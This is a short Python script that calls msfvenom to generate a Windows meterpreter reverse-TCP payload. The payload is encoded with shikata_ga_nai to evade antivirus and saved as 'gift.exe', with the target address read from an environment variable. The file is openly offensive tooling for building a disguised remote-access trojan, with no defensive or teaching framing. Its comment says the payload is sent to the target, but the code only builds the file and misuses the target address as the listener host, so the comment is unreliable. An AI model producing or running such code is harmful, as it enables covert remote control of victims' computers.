import os
import sys
import time
from dotenv import load_dotenv
load_dotenv()


our_target = os.getenv("our_target")

# send msfvenom payload to target's ip address
os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={our_target} -e x86/shikata_ga_nai LPORT=4444 -f exe > gift.exe")